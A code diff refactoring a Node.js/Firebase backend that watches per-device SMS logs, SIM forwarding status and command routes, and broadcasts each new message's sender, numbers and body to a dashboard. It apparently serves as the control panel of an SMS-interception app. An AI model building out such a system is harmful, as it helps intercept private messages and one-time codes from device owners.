@@ -535,8 +535,8 @@ app.get("/api/lastcheck/:uid", async (req, res) => {
       LIVE WATCHERS: SMS STATUS + SIM FORWARD STATUS
 ====================================================== */
 
-const smsStatusRef = rtdb.ref("smsStatus");  
-const lastStatusCache = {};                  
+const smsStatusRef = rtdb.ref("smsStatus");
+const lastStatusCache = {};
 
 function normalizeSmsStatusSnap(snap) {
   if (!snap.exists()) return null;
@@ -549,7 +549,6 @@ function normalizeSmsStatusSnap(snap) {
   return { all, latest };
 }
 
-
 /* ======================================================
       ⭐ PERFECT SMS STATUS LIVE ⭐
 ====================================================== */
@@ -558,7 +557,7 @@ function handleSmsStatusSingle(uid, msgId, data, event) {
   if (!lastStatusCache[uid]) lastStatusCache[uid] = {};
 
   const prev = lastStatusCache[uid][msgId] || null;
-  const now  = data || null;
+  const now = data || null;
   if (prev && JSON.stringify(prev) === JSON.stringify(now)) {
     return;
   }
@@ -676,69 +675,64 @@ simForwardRef.on("child_removed", (snap) =>
   handleSimForwardChange(snap, "removed")
 );
 
-
 /* ======================================================
-   ⭐ SMS LIVE — ONLY NEW / CHANGED SMS LOG
+   ⭐ SMS LIVE — ONLY NEW / CHANGED SMS LOG  (FIXED)
 ====================================================== */
 
 const smsNotificationsRef = rtdb.ref(SMS_NODE);
 
-function getLatestChange(prevObj, newObj) {
-  if (!prevObj) return Object.keys(newObj)[0];
-
-  const prevKeys = new Set(Object.keys(prevObj));
-  const newKeys = Object.keys(newObj);
-
-  for (let k of newKeys) {
-    if (!prevKeys.has(k)) return k; 
-    if (JSON.stringify(prevObj[k]) !== JSON.stringify(newObj[k])) return k;
-  }
-
-  return null; 
-}
-
+// Simple cache: last latest SMS ID per device
 const smsCache = {};
 
-// ⭐⭐ UPDATED: emit `smsLogsNew` also ⭐⭐
+// PURE helper: build sorted list & latest SMS
+function buildSortedSmsList(uid, messages) {
+  const list = Object.entries(messages || {}).map(([id, obj]) => ({
+    id,
+    uniqueid: uid,
+    ...obj,
+  }));
+
+  list.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+  return list;
+}
+
 async function handleSmsNotificationsBranch(snap, event = "update") {
   const uid = snap.key;
   const messages = snap.val() || {};
 
-  const prev = smsCache[uid] || null;
-  const changedMsgId = getLatestChange(prev, messages);
+  // Full sorted list for this device
+  const list = buildSortedSmsList(uid, messages);
+  const latest = list[0] || null;
 
-  smsCache[uid] = messages;
+  const prevLatestId = smsCache[uid]?.latestId || null;
+  const newLatestId = latest?.id || null;
 
-  if (changedMsgId) {
-    const sms = messages[changedMsgId];
+  smsCache[uid] = { latestId: newLatestId };
 
+  if (latest && newLatestId && newLatestId !== prevLatestId) {
     console.log("\n\n======== 📩 NEW / CHANGED SMS ========");
     console.log(`📌 DEVICE: ${uid}`);
-    console.log(`🆔 SMS-ID: ${changedMsgId}`);
-    console.log(`👤 Sender: ${sms.sender}`);
-    console.log(`📞 Sender Number: ${sms.senderNumber}`);
-    console.log(`📥 Receiver Number: ${sms.receiverNumber}`);
-    console.log(`🕒 Timestamp: ${sms.timestamp}`);
-    console.log(`✉️ Message: ${sms.body}`);
+    console.log(`🆔 SMS-ID: ${latest.id}`);
+    console.log(`👤 Sender: ${latest.sender}`);
+    console.log(`📞 Sender Number: ${latest.senderNumber}`);
+    console.log(`📥 Receiver Number: ${latest.receiverNumber}`);
+    console.log(`🕒 Timestamp: ${latest.timestamp}`);
+    console.log(`✉️ Message: ${latest.body}`);
     console.log("=======================================\n\n");
 
-    // ⭐ SEND SINGLE NEW/UPDATED SMS TO FRONTEND
+    // ⭐ Single latest NEW/UPDATED SMS to frontend (FAST)
     io.emit("smsLogsNew", {
       success: true,
       uniqueid: uid,
-      msgId: changedMsgId,
-      data: {
-        id: changedMsgId,
-        uniqueid: uid,
-        ...sms,
-      },
+      msgId: latest.id,
+      data: latest,
     });
   }
 
   // Per-device full list (for device-details page)
   emitSmsDeviceLive(uid, messages, event);
 
-  // Full refresh for All Messages page
+  // Full refresh for All Messages page (messages.html)
   await refreshSmsAllLive(`sms_${event}:${uid}`);
 }
 
@@ -755,7 +749,7 @@ smsNotificationsRef.on("child_removed", async (snap) => {
 
   console.log(`🗑 SMS branch removed for device ${uid}`);
 
-  smsCache[uid] = {};
+  smsCache[uid] = { latestId: null };
 
   emitSmsDeviceLive(uid, {}, "removed");
   await refreshSmsAllLive(`sms_removed:${uid}`);
@@ -800,7 +794,7 @@ app.use(adminRoutes);
 app.use("/api", checkRoutes);
 app.use("/api", userFullDataRoutes);
 app.use(commandRoutes);
-app.use(smsRoutes); 
+app.use(smsRoutes);
 
 app.get("/", (_, res) => {
   res.send(" RTDB + Socket.IO Backend Running");
